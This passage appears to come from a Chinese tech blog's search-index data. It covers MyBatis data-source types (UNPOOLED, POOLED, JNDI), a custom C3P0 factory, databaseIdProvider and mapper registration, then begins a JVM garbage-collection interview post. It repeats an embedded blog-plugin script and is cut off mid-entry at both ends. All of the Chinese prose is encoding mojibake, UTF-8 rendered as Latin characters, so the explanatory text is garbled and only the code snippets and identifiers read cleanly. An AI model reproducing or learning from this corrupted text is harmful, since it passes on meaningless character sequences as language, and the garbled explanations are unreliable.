è½½ç‰¹æ€§ï¼Œå°±å¿…é¡»é…ç½®æ•°æ®æºã€‚MyBatis æä¾›äº†ä¸‰ç§å†…å»ºçš„æ•°æ®æºç±»å‹ï¼Œä¹Ÿå°±æ˜¯ type="[UNPOOLED | POOLED | JNDI]"ã€‚ UNPOOLEDUNPOOLED æ•°æ®æºçš„å®ç°ä¼šæ¯æ¬¡è¯·æ±‚æ—¶æ‰“å¼€å’Œå…³é—­è¿æ¥ã€‚è™½ç„¶æœ‰ç‚¹æ…¢ï¼Œä½†å¯¹é‚£äº›æ•°æ®åº“è¿æ¥å¯ç”¨æ€§è¦æ±‚ä¸é«˜çš„ç®€å•åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ æ€§èƒ½è¡¨ç°åˆ™ä¾èµ–äºä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¯¹æŸäº›æ•°æ®åº“æ¥è¯´ï¼Œä½¿ç”¨è¿æ¥æ± å¹¶ä¸é‡è¦ï¼Œè¿™ä¸ªé…ç½®å°±å¾ˆé€‚åˆè¿™ç§æƒ…å½¢ã€‚ driver â€“ è¿™æ˜¯ JDBC é©±åŠ¨çš„ Java ç±»å…¨é™å®šåï¼ˆå¹¶ä¸æ˜¯ JDBC é©±åŠ¨ä¸­å¯èƒ½åŒ…å«çš„æ•°æ®æºç±»ï¼‰ã€‚ url â€“ è¿™æ˜¯æ•°æ®åº“çš„ JDBC URL åœ°å€ã€‚ username â€“ ç™»å½•æ•°æ®åº“çš„ç”¨æˆ·åã€‚ password â€“ ç™»å½•æ•°æ®åº“çš„å¯†ç ã€‚ defaultTransactionIsolationLevel â€“ é»˜è®¤çš„è¿æ¥äº‹åŠ¡éš”ç¦»çº§åˆ«ã€‚ defaultNetworkTimeout â€“ ç­‰å¾…æ•°æ®åº“æ“ä½œå®Œæˆçš„é»˜è®¤ç½‘ç»œè¶…æ—¶æ—¶é—´ï¼ˆå•ä½ï¼šæ¯«ç§’ï¼‰ã€‚ ä½œä¸ºå¯é€‰é¡¹ï¼Œä½ ä¹Ÿå¯ä»¥ä¼ é€’å±æ€§ç»™æ•°æ®åº“é©±åŠ¨ã€‚åªéœ€åœ¨å±æ€§ååŠ ä¸Š driver. å‰ç¼€å³å¯ï¼Œä¾‹å¦‚ï¼šdriver.encoding=UTF8ã€‚è¿™å°†é€šè¿‡ DriverManager.getConnection(url, driverProperties) æ–¹æ³•ä¼ é€’å€¼ä¸º UTF8 çš„ encoding å±æ€§ç»™æ•°æ®åº“é©±åŠ¨ã€‚ POOLEDPOOLED æ•°æ®æºçš„å®ç°åˆ©ç”¨äº†â€ æ± â€ çš„æ¦‚å¿µå°† JDBC è¿æ¥å¯¹è±¡ç»„ç»‡èµ·æ¥ï¼Œé¿å…äº†åˆ›å»ºæ–°çš„è¿æ¥å®ä¾‹æ—¶æ‰€å¿…éœ€çš„åˆå§‹åŒ–å’Œè®¤è¯æ—¶é—´ã€‚è¿™ç§å¤„ç†æ–¹å¼å¾ˆæµè¡Œï¼Œèƒ½ä½¿å¹¶å‘ Web åº”ç”¨å¿«é€Ÿå“åº”è¯·æ±‚ã€‚é™¤äº†ä¸Šè¿°æåˆ° UNPOOLED ä¸‹çš„å±æ€§å¤–ï¼Œè¿˜æœ‰æ›´å¤šå±æ€§ç”¨æ¥é…ç½® POOLED çš„æ•°æ®æºï¼š poolMaximumActiveConnections â€“ åœ¨ä»»æ„æ—¶é—´å¯å­˜åœ¨çš„æ´»åŠ¨ï¼ˆæ­£åœ¨ä½¿ç”¨ï¼‰è¿æ¥æ•°é‡ï¼Œé»˜è®¤å€¼ï¼š10 poolMaximumIdleConnections â€“ ä»»æ„æ—¶é—´å¯èƒ½å­˜åœ¨çš„ç©ºé—²è¿æ¥æ•°ã€‚ poolMaximumCheckoutTime â€“ åœ¨è¢«å¼ºåˆ¶è¿”å›ä¹‹å‰ï¼Œæ± ä¸­è¿æ¥è¢«æ£€å‡ºï¼ˆchecked outï¼‰æ—¶é—´ï¼Œé»˜è®¤å€¼ï¼š20000 æ¯«ç§’ï¼ˆå³ 20 ç§’ï¼‰ poolTimeToWait â€“ è¿™æ˜¯ä¸€ä¸ªåº•å±‚è®¾ç½®ï¼Œå¦‚æœè·å–è¿æ¥èŠ±è´¹äº†ç›¸å½“é•¿çš„æ—¶é—´ï¼Œè¿æ¥æ± ä¼šæ‰“å°çŠ¶æ€æ—¥å¿—å¹¶é‡æ–°å°è¯•è·å–ä¸€ä¸ªè¿æ¥ï¼ˆé¿å…åœ¨è¯¯é…ç½®çš„æƒ…å†µä¸‹ä¸€ç›´å¤±è´¥ä¸”ä¸æ‰“å°æ—¥å¿—ï¼‰ï¼Œé»˜è®¤å€¼ï¼š20000 æ¯«ç§’ï¼ˆå³ 20 ç§’ï¼‰ã€‚ poolMaximumLocalBadConnectionTolerance â€“ è¿™æ˜¯ä¸€ä¸ªå…³äºåè¿æ¥å®¹å¿åº¦çš„åº•å±‚è®¾ç½®ï¼Œä½œç”¨äºæ¯ä¸€ä¸ªå°è¯•ä»è¿æ¥æ± è·å–è¿æ¥çš„çº¿ç¨‹ã€‚å¦‚æœè¿™ä¸ªçº¿ç¨‹è·å–åˆ°çš„æ˜¯ä¸€ä¸ªåçš„è¿æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®æºå…è®¸è¿™ä¸ªçº¿ç¨‹å°è¯•é‡æ–°è·å–ä¸€ä¸ªæ–°çš„è¿æ¥ï¼Œä½†æ˜¯è¿™ä¸ªé‡æ–°å°è¯•çš„æ¬¡æ•°ä¸åº”è¯¥è¶…è¿‡ poolMaximumIdleConnections ä¸ poolMaximumLocalBadConnectionTolerance ä¹‹å’Œã€‚ é»˜è®¤å€¼ï¼š3ï¼ˆæ–°å¢äº 3.4.5 ç‰ˆæœ¬ï¼‰ poolPingQuery â€“ å‘é€åˆ°æ•°æ®åº“çš„ä¾¦æµ‹æŸ¥è¯¢ï¼Œç”¨æ¥æ£€éªŒè¿æ¥æ˜¯å¦æ­£å¸¸å·¥ä½œå¹¶å‡†å¤‡æ¥å—è¯·æ±‚ã€‚é»˜è®¤æ˜¯ NO PING QUERY SETï¼Œè¿™ä¼šå¯¼è‡´å¤šæ•°æ•°æ®åº“é©±åŠ¨å‡ºé”™æ—¶è¿”å›æ°å½“çš„é”™è¯¯æ¶ˆæ¯ã€‚ poolPingEnabled â€“ æ˜¯å¦å¯ç”¨ä¾¦æµ‹æŸ¥è¯¢ã€‚è‹¥å¼€å¯ï¼Œéœ€è¦è®¾ç½® poolPingQuery å±æ€§ä¸ºä¸€ä¸ªå¯æ‰§è¡Œçš„ SQL è¯­å¥ï¼ˆæœ€å¥½æ˜¯ä¸€ä¸ªé€Ÿåº¦éå¸¸å¿«çš„ SQL è¯­å¥ï¼‰ï¼Œé»˜è®¤å€¼ï¼šfalseã€‚ poolPingConnectionsNotUsedFor â€“ é…ç½® poolPingQuery çš„é¢‘ç‡ã€‚å¯ä»¥è¢«è®¾ç½®ä¸ºå’Œæ•°æ®åº“è¿æ¥è¶…æ—¶æ—¶é—´ä¸€æ ·ï¼Œæ¥é¿å…ä¸å¿…è¦çš„ä¾¦æµ‹ï¼Œé»˜è®¤å€¼ï¼š0ï¼ˆå³æ‰€æœ‰è¿æ¥æ¯ä¸€æ—¶åˆ»éƒ½è¢«ä¾¦æµ‹ â€” å½“ç„¶ä»…å½“ poolPingEnabled ä¸º true æ—¶é€‚ç”¨ï¼‰ã€‚ JNDIJNDI æ•°æ®æºçš„å®ç°æ˜¯ä¸ºäº†èƒ½åœ¨å¦‚ EJB æˆ–åº”ç”¨æœåŠ¡å™¨è¿™ç±»å®¹å™¨ä¸­ä½¿ç”¨ï¼Œå®¹å™¨å¯ä»¥é›†ä¸­æˆ–åœ¨å¤–éƒ¨é…ç½®æ•°æ®æºï¼Œç„¶åæ”¾ç½®ä¸€ä¸ª JNDI ä¸Šä¸‹æ–‡çš„æ•°æ®æºå¼•ç”¨ã€‚è¿™ç§æ•°æ®æºé…ç½®åªéœ€è¦ä¸¤ä¸ªå±æ€§ï¼š initial_context â€“ è¿™ä¸ªå±æ€§ç”¨æ¥åœ¨ InitialContext ä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡ï¼Œå³ initialContext.lookup(initial_context)ï¼‰ã€‚è¿™æ˜¯ä¸ªå¯é€‰å±æ€§ï¼Œå¦‚æœå¿½ç•¥ï¼Œé‚£ä¹ˆå°†ä¼šç›´æ¥ä» InitialContext ä¸­å¯»æ‰¾ data_source å±æ€§ã€‚ data_source â€“ è¿™æ˜¯å¼•ç”¨æ•°æ®æºå®ä¾‹ä½ç½®çš„ä¸Šä¸‹æ–‡è·¯å¾„ã€‚æä¾›äº† initial_context é…ç½®æ—¶ä¼šåœ¨å…¶è¿”å›çš„ä¸Šä¸‹æ–‡ä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼Œæ²¡æœ‰æä¾›æ—¶åˆ™ç›´æ¥åœ¨ InitialContext ä¸­æŸ¥æ‰¾ã€‚ JNDI å’Œå…¶ä»–æ•°æ®æºé…ç½®ç±»ä¼¼ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ å‰ç¼€ env. ç›´æ¥æŠŠå±æ€§ä¼ é€’ç»™ InitialContextã€‚æ¯”å¦‚ env.encoding=UTF8ï¼Œè¿™å°†ä¼šåœ¨ InitialContext å®ä¾‹åŒ–æ—¶å¾€å®ƒçš„æ„é€ æ–¹æ³•ä¼ é€’å€¼ä¸º UTF8 çš„ encoding å±æ€§ã€‚ é€šè¿‡è¿‡å®ç°æ¥å£ org.apache.ibatis.datasource.DataSourceFactory æ¥è‡ªå®šä¹‰ç¬¬ä¸‰æ–¹æ•°æ®æºçš„å®ç°ï¼š 123456public interface DataSourceFactory { void setProperties(Properties props); DataSource getDataSource();} org.apache.ibatis.datasource.unpooled.UnpooledDataSourceFactory å¯è¢«ç”¨ä½œçˆ¶ç±»æ¥æ„å»ºæ–°çš„æ•°æ®æºé€‚é…å™¨ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ®µæ’å…¥ C3P0 æ•°æ®æºæ‰€å¿…éœ€çš„ä»£ç ï¼š 12345678910import org.apache.ibatis.datasource.unpooled.UnpooledDataSourceFactory;import com.mchange.v2.c3p0.ComboPooledDataSource;public class C3P0DataSourceFactory extends UnpooledDataSourceFactory { public C3P0DataSourceFactory() { this.dataSource = new ComboPooledDataSource(); }} ä¸ºäº†ä»¤è‡ªå®šä¹‰çš„æ•°æ®æºå·¥ä½œï¼Œè®°å¾—åœ¨é…ç½®æ–‡ä»¶ä¸­ä¸ºæ¯ä¸ªå¸Œæœ› MyBatis è°ƒç”¨çš„ setter æ–¹æ³•å¢åŠ å¯¹åº”çš„å±æ€§ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯ä»¥è¿æ¥è‡³ PostgreSQL æ•°æ®åº“çš„ä¾‹å­ï¼š 123456&lt;dataSource type="org.myproject.C3P0DataSourceFactory"&gt; &lt;property name="driver" value="org.postgresql.Driver"/&gt; &lt;property name="url" value="jdbc:postgresql:mydb"/&gt; &lt;property name="username" value="postgres"/&gt; &lt;property name="password" value="root"/&gt;&lt;/dataSource&gt; æ•°æ®åº“å‚å•†æ ‡è¯†ï¼ˆdatabaseIdProviderï¼‰MyBatis å¯ä»¥æ ¹æ®ä¸åŒçš„æ•°æ®åº“å‚å•†æ‰§è¡Œä¸åŒçš„è¯­å¥ï¼Œè¿™ç§å¤šå‚å•†çš„æ”¯æŒæ˜¯åŸºäºæ˜ å°„è¯­å¥ä¸­çš„ databaseId å±æ€§ã€‚ MyBatis ä¼šåŠ è½½å¸¦æœ‰åŒ¹é…å½“å‰æ•°æ®åº“ databaseId å±æ€§å’Œæ‰€æœ‰ä¸å¸¦ databaseId å±æ€§çš„è¯­å¥ã€‚å¦‚æœåŒæ—¶æ‰¾åˆ°å¸¦æœ‰ databaseId å’Œä¸å¸¦ databaseId çš„ç›¸åŒè¯­å¥ï¼Œåˆ™åè€…ä¼šè¢«èˆå¼ƒã€‚ä¸ºæ”¯æŒå¤šå‚å•†ç‰¹æ€§ï¼Œåªè¦åƒä¸‹é¢è¿™æ ·åœ¨ mybatis-config.xml æ–‡ä»¶ä¸­åŠ å…¥ databaseIdProvider å³å¯ï¼š 1&lt;databaseIdProvider type="DB_VENDOR" /&gt; databaseIdProvider å¯¹åº”çš„ DB_VENDOR å®ç°ï¼ˆVendorDatabaseIdProviderï¼‰ä¼šå°† databaseId è®¾ç½®ä¸º DatabaseMetaData#getDatabaseProductName() è¿”å›çš„å­—ç¬¦ä¸²ã€‚ç”±äºé€šå¸¸æƒ…å†µä¸‹è¿™äº›å­—ç¬¦ä¸²éƒ½éå¸¸é•¿ï¼Œè€Œä¸”ç›¸åŒäº§å“çš„ä¸åŒç‰ˆæœ¬ä¼šè¿”å›ä¸åŒçš„å€¼ï¼Œæ­¤æ—¶é€šè¿‡è®¾ç½®å±æ€§åˆ«åæ¥ä½¿å…¶å˜çŸ­ï¼š 12345678&lt;configuration&gt; &lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="SQL Server" value="sqlserver"/&gt; &lt;property name="DB2" value="db2"/&gt; &lt;property name="MySQL" value="mysql"/&gt; &lt;property name="Oracle" value="oracle" /&gt; &lt;/databaseIdProvider&gt;&lt;/configuration&gt; æç¤º åœ¨ä¸Šè¿°çš„é…ç½®ä¸­ï¼Œname æ˜¯ getDatabaseProductName() è¿”å›å­—ç¬¦ä¸²å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œvalue åˆ™æ˜¯å±æ€§åˆ«åã€‚ åœ¨æä¾›äº†å±æ€§åˆ«åæ—¶ï¼ŒdatabaseIdProvider çš„ DB_VENDOR å®ç°ä¼šå°† databaseId è®¾ç½®ä¸ºæ•°æ®åº“äº§å“åä¸å±æ€§ä¸­çš„åç§°ç¬¬ä¸€ä¸ªç›¸åŒ¹é…çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…çš„å±æ€§ï¼Œå°†ä¼šè®¾ç½®ä¸º nullã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ getDatabaseProductName() è¿”å›çš„å­—ç¬¦ä¸²å†…å®¹ä¸º â€œOracle (DataDirect)â€ï¼Œåˆ™ databaseId å°†è¢«è®¾ç½®ä¸º oracleã€‚æœ€åéœ€è¦åœ¨ç¼–å†™ SQL è¯­å¥æ—¶ï¼Œé€šè¿‡ databaseId æŒ‡å®šå±æ€§åˆ«åï¼Œä¾‹å¦‚ï¼š 123&lt;select id="getById" resultType="Employee" databaseId="mysql"&gt; select id, last_name, gender, email from t_employee where id = #{id}&lt;/select&gt; æ˜ å°„å™¨ï¼ˆmappersï¼‰æ—¢ç„¶ MyBatis çš„è¡Œä¸ºå·²ç»ç”±ä¸Šè¿°æ ‡ç­¾é…ç½®å®Œäº†ï¼Œé‚£ä¹ˆç°åœ¨å°±éœ€è¦å®šä¹‰ SQL æ˜ å°„è¯­å¥äº†ã€‚ä½†é¦–å…ˆï¼Œéœ€è¦å‘Šè¯‰ MyBatis åˆ°å“ªé‡Œå»æ‰¾åˆ°è¿™äº›è¯­å¥ã€‚åœ¨è‡ªåŠ¨æŸ¥æ‰¾èµ„æºæ–¹é¢ï¼ŒJava å¹¶æ²¡æœ‰æä¾›ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œæ‰€ä»¥æœ€å¥½çš„åŠæ³•æ˜¯ç›´æ¥å‘Šè¯‰ MyBatis åˆ°å“ªé‡Œå»æ‰¾æ˜ å°„æ–‡ä»¶ã€‚MyBatis å¯ä»¥ä½¿ç”¨ç›¸å¯¹äºç±»è·¯å¾„çš„èµ„æºå¼•ç”¨ï¼Œæˆ–å®Œå…¨é™å®šèµ„æºå®šä½ç¬¦ï¼ˆåŒ…æ‹¬ file:/// å½¢å¼çš„ URLï¼‰ï¼Œæˆ–ç±»åå’ŒåŒ…åç­‰ã€‚ä¾‹å¦‚ï¼š ä½¿ç”¨ç›¸å¯¹äºç±»è·¯å¾„çš„èµ„æºå¼•ç”¨ æç¤º å¦‚æœåœ¨ SQL æ˜ å°„æ–‡ä»¶ä¸­ï¼Œnamespace æ˜¯ DAO æ¥å£çš„å…¨é™å®šç±»åï¼Œé‚£ä¹ˆ MyBatis ä¼šæ‰¾åˆ°å¯¹åº”çš„ DAO æ¥å£ï¼Œç„¶åä¸ºå…¶ç”Ÿæˆä»£ç†å¯¹è±¡ã€‚ 1234567&lt;configuration&gt; &lt;mappers&gt; &lt;mapper resource="org/mybatis/builder/AuthorMapper.xml"/&gt; &lt;mapper resource="org/mybatis/builder/BlogMapper.xml"/&gt; &lt;mapper resource="org/mybatis/builder/PostMapper.xml"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; ä½¿ç”¨å®Œå…¨é™å®šèµ„æºå®šä½ç¬¦ï¼ˆURLï¼‰ æç¤º å¦‚æœåœ¨ SQL æ˜ å°„æ–‡ä»¶ä¸­ï¼Œnamespace æ˜¯ DAO æ¥å£çš„å…¨é™å®šç±»åï¼Œé‚£ä¹ˆ MyBatis ä¼šæ‰¾åˆ°å¯¹åº”çš„ DAO æ¥å£ï¼Œç„¶åä¸ºå…¶ç”Ÿæˆä»£ç†å¯¹è±¡ã€‚ 1234567&lt;configuration&gt; &lt;mappers&gt; &lt;mapper url="file:///var/mappers/AuthorMapper.xml"/&gt; &lt;mapper url="file:///var/mappers/BlogMapper.xml"/&gt; &lt;mapper url="file:///var/mappers/PostMapper.xml"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; ä½¿ç”¨æ˜ å°„å™¨æ¥å£å®ç°ç±»çš„å®Œå…¨é™å®šç±»å ç‰¹åˆ«æ³¨æ„ ç¬¬ä¸€ç§æƒ…å†µï¼šæ²¡æœ‰ SQL æ˜ å°„æ–‡ä»¶ï¼ŒSQL è¯­å¥å…¨éƒ¨é€šè¿‡æ³¨è§£çš„æ–¹å¼å†™åœ¨ DAO æ¥å£é‡Œï¼Œæ­¤æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨æ­¤æ–¹å¼ ç¬¬äºŒç§æƒ…å†µï¼šæœ‰ SQL è¯­å¥å†™åœ¨ SQL æ˜ å°„æ–‡ä»¶é‡Œï¼Œæ­¤æ—¶å¿…é¡»æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼Œå¦åˆ™ MyBatis æ— æ³•æ­£å¸¸æ˜ å°„ SQL è¯­å¥ SQL æ˜ å°„æ–‡ä»¶å¿…é¡»ä¸ Java æ¥å£æ–‡ä»¶åŒå SQL æ˜ å°„æ–‡ä»¶å¿…é¡»ä¸ Java æ¥å£æ–‡ä»¶æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼ˆåŒ…ï¼‰ 1234567&lt;configuration&gt; &lt;mappers&gt; &lt;mapper class="org.mybatis.builder.AuthorMapper"/&gt; &lt;mapper class="org.mybatis.builder.BlogMapper"/&gt; &lt;mapper class="org.mybatis.builder.PostMapper"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; å°†åŒ…å†…çš„æ˜ å°„å™¨æ¥å£å®ç°å…¨éƒ¨æ³¨å†Œä¸ºæ˜ å°„å™¨ ç‰¹åˆ«æ³¨æ„ ä¸Šè¿°åœ¨ "ä½¿ç”¨æ˜ å°„å™¨æ¥å£å®ç°ç±»çš„å®Œå…¨é™å®šç±»å" æ–¹å¼ä¸­ï¼Œä»‹ç»åˆ°çš„ä¸¤ç§æƒ…å†µä¹Ÿé€‚ç”¨äºæ­¤æ–¹å¼ 12345&lt;configuration&gt; &lt;mappers&gt; &lt;package name="org.mybatis.builder"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; æç¤º æ¯”è¾ƒé‡è¦çš„ã€å¤æ‚çš„ DAO æ¥å£ï¼Œå»ºè®®å°† SQL è¯­å¥å†™åœ¨ SQL æ˜ å°„æ–‡ä»¶é‡Œ ä¸é‡è¦çš„ã€ç®€å•çš„ DAO æ¥å£ï¼Œä¸ºäº†å¿«é€Ÿå¼€å‘é¡¹ç›®ï¼Œå¯ä»¥é€šè¿‡æ³¨è§£å°† SQL è¯­å¥å†™åœ¨ DAO æ¥å£é‡Œ è¡¥å……å†…å®¹å¤„ç†æšä¸¾ç±»å‹ MyBatis å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ - ç±»å‹å¤„ç†å™¨ MyBatis å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ - å¤„ç†æšä¸¾ç±»å‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"Java è™šæ‹Ÿæœºé¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/56993278.html",text:'Java è™šæ‹ŸæœºJVM ä½“ç³»ç»“æ„JVM å†…å­˜ç»“æ„ä¸»è¦æœ‰ä¸‰å¤§å—ï¼šæ ˆã€å †å†…å­˜ã€æ–¹æ³•åŒºã€‚å †å†…å­˜æ˜¯ JVM ä¸­æœ€å¤§çš„ä¸€å—ï¼Œç”±æ–°ç”Ÿä»£å’Œè€å¹´ä»£ç»„æˆï¼Œä¸åŒ…æ‹¬æ°¸ä¹…ä»£ï¼ˆæ–¹æ³•åŒºï¼‰ï¼›è€Œæ–°ç”Ÿä»£å†…å­˜åˆè¢«åˆ†æˆ Eden ç©ºé—´ã€From Survivor ç©ºé—´ã€To Survivor ç©ºé—´ï¼Œé»˜è®¤æƒ…å†µä¸‹æ–°ç”Ÿä»£æŒ‰ç…§ 8:1:1 çš„æ¯”ä¾‹æ¥åˆ†é…ã€‚æ–¹æ³•åŒºå­˜å‚¨ç±»ä¿¡æ¯ã€é™æ€å˜é‡ã€å¸¸é‡ã€å¸¸é‡æ± ç­‰æ•°æ®ï¼Œæ˜¯çº¿ç¨‹å…±äº«çš„åŒºåŸŸï¼Œä¸ºäº†ä¸ Java å †åŒºåˆ†ï¼Œæ–¹æ³•åŒºè¿˜æœ‰ä¸€ä¸ªåˆ«å Non-Heap ï¼ˆéå †ï¼‰ã€‚æ ˆåˆåˆ†ä¸º Java è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆï¼Œä¸»è¦ç”¨äºæ–¹æ³•çš„æ‰§è¡Œã€‚ JVM åƒåœ¾æ”¶é›†æœºåˆ¶GC å‘ç”Ÿåœ¨å †ä¸­ï¼ŒGC çš„ç±»å‹å¦‚ä¸‹ï¼š æ¬¡æ•°ä¸Šé¢‘ç¹æ”¶é›†æ–°ç”Ÿä»£ï¼ˆMinor GCï¼‰ æ¬¡æ•°ä¸Šå°‘æ”¶é›†è€å¹´ä»£ï¼ˆFull GCï¼‰ åŸºæœ¬ä¸åŠ¨æ–¹æ³•åŒº GC ç®—æ³• å¦‚ä½•ç¡®å®šä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¼šè¢«å›æ”¶ å¼•ç”¨è®¡æ•°ç®—æ³•ï¼ˆReference Countingï¼‰ å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆReachability Analysisï¼‰ GC ç®—æ³• å¤åˆ¶ç®—æ³•ï¼ˆCopyingï¼‰ æ ‡è®° - æ¸…é™¤ç®—æ³•ï¼ˆMark-Sweepï¼‰ æ ‡è®° - ç®—æ³•ï¼ˆMark-Compactï¼‰ åˆ†ä»£æ”¶é›†ç®—æ³• GC ç®—æ³•å¯¹æ¯” å¤åˆ¶ç®—æ³• å¤åˆ¶ç®—æ³•æ‰§è¡Œçš„é€Ÿåº¦è¾ƒå¿«ï¼Œå…¸å‹çš„ç©ºé—´æ¢æ—¶é—´ å½“å¯¹è±¡çš„å­˜æ´»ç‡å¾ˆé«˜çš„æ—¶å€™ï¼Œä¸æ–­çš„å¤åˆ¶æ“ä½œä¼šæ˜¾å¾—è€—æ—¶ å¤åˆ¶ç®—æ³•å¾ˆæ˜æ˜¾çš„ç¼ºç‚¹å°±æ˜¯æµªè´¹å†…å­˜ç©ºé—´ï¼Œå› ä¸ºå°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œä¸€æ¬¡åªèƒ½ä½¿ç”¨ä¸€å—ï¼Œè¿™ä¹Ÿæ„å‘³ç€åˆ†çš„å—è¶Šå¤§ï¼Œæµªè´¹çš„å†…å­˜è¶Šå¤š æ ‡è®° - æ¸…é™¤ç®—æ³• é¦–å…ˆæ˜¯é€Ÿåº¦æ…¢ï¼Œå› ä¸ºâ€ æ ‡è®° - æ¸…é™¤ç®—æ³•â€ åœ¨æ ‡è®°é˜¶æ®µéœ€è¦ä½¿ç”¨é€’å½’çš„æ–¹å¼ä»æ ¹ç»“ç‚¹å‡ºå‘ï¼Œä¸æ–­å¯»æ‰¾å¯è¾¾çš„å¯¹è±¡ï¼›è€Œåœ¨æ¸…é™¤é˜¶æ®µåˆéœ€è¦éå†å †å†…å­˜ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼ŒæŸ¥çœ‹å…¶æ˜¯å¦è¢«æ ‡è®°ï¼Œç„¶åæ¸…é™¤ï¼›å¹¶ä¸”å…¶å®åœ¨ç¨‹åºè¿›è¡Œ GC çš„æ—¶å€™ï¼ŒJVM ä¸­æ‰€æœ‰çš„ Java ç¨‹åºéƒ½è¦è¿›è¡Œæš‚åœï¼Œä¿—ç§° Stop-The-Worldï¼Œåé¢ä¼šæåˆ°ã€‚ å…¶æ¬¡æ˜¯å…¶æœ€å¤§çš„ç¼ºç‚¹ï¼Œä½¿ç”¨è¿™ç§ç®—æ³•è¿›è¡Œæ¸…ç†è€Œå¾—çš„å †å†…å­˜çš„ç©ºé—²ç©ºé—´ä¸€èˆ¬æ˜¯ä¸è¿ç»­çš„ï¼Œç”±äºå¯¹è±¡å®ä¾‹åœ¨å †å†…å­˜ä¸­æ˜¯éšæœºå­˜å‚¨çš„ï¼Œæ‰€ä»¥åœ¨æ¸…ç†ä¹‹åï¼Œä¼šäº§ç”Ÿè®¸å¤šçš„å†…å­˜ç¢ç‰‡ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™æ¥äº†ä¸€ä¸ªå¾ˆå¤§çš„å¯¹è±¡å®ä¾‹ï¼Œå°½ç®¡æ˜¾ç¤ºå†…å­˜è¿˜è¶³å¤Ÿï¼Œä½†æ˜¯å·²ç»å­˜ä¸ä¸‹è¿™ä¸ªå¤§å¯¹è±¡äº†ï¼Œå†…å­˜ç¢ç‰‡å¤ªå¤šä¼šå¯¼è‡´å½“ç¨‹åºéœ€è¦ä¸ºè¾ƒå¤§å¯¹è±¡åˆ†é…å†…å­˜æ—¶æ— æ³•æ‰¾åˆ°è¶³å¤Ÿçš„è¿ç»­å†…å­˜è€Œä¸å¾—ä¸æå‰è§¦å‘å¦ä¸€æ¬¡åƒåœ¾æ”¶é›†åŠ¨ä½œã€‚å†è€…ï¼Œè¿™ç§é›¶æ•£çš„ç¢ç‰‡å¯¹äºæ•°ç»„çš„åˆ†é…ä¹Ÿä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚ æ ‡è®° - æ•´ç†ç®—æ³• é¦–å…ˆè¿™ç§ç®—æ³•å…‹æœäº†â€ æ ‡è®° - æ¸…é™¤ç®—æ³•â€ ä¸­ä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡çš„ç¼ºç‚¹ï¼Œä¹Ÿè§£å†³äº†å¤åˆ¶ç®—æ³•ä¸­å†…å­˜å‡åŠä½¿ç”¨çš„ä¸è¶³ è€Œå…¶ç¼ºç‚¹åˆ™æ˜¯é€Ÿåº¦ä¹Ÿä¸æ˜¯å¾ˆå¿«ï¼Œä¸ä»…è¦éå†æ ‡è®°æ‰€æœ‰å¯è¾¾ç»“ç‚¹ï¼Œè¿˜è¦ä¸€ä¸ªä¸ªå¯è¾¾å­˜æ´»å¯¹è±¡çš„åœ°å€ï¼Œæ‰€ä»¥å¯¼è‡´å…¶æ•ˆç‡ä¸æ˜¯å¾ˆé«˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Linux ç”Ÿäº§ç¯å¢ƒæ­å»º Zookeeper é›†ç¾¤",url:"/posts/8ed765da.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äºåœ¨ Centos/Debian/Ubuntu ç­‰ Linux 